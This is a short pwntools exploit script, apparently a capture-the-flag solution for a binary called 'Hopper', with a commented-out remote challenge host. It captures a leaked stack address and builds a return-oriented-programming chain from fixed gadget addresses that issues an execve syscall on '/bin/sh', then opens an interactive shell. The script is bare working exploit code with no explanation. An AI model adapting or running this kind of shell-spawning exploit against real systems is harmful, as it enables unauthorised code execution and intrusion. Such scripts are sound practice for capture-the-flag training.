#!/usr/bin/env python3


from pwn import *


e = ELF("./Hopper")
r = process("./Hopper")
#r = remote("pwn.1nf1n1ty.team",31886)
leak = u64(r.recvuntil(b"\x7f")[-6:].decode('latin-1').ljust(8,'\x00'))
exploit = p64(0x401017)  + p64(leak + 0x30) + p64(leak + 0x8) + p64(0x3b) + p64(0x401011) + p64(0x401021) + p64(0x40100c) + p64(0x401027) + p64(0x40100a)   + b"/bin/sh\x00"
r.sendline(exploit)
r.interactive()
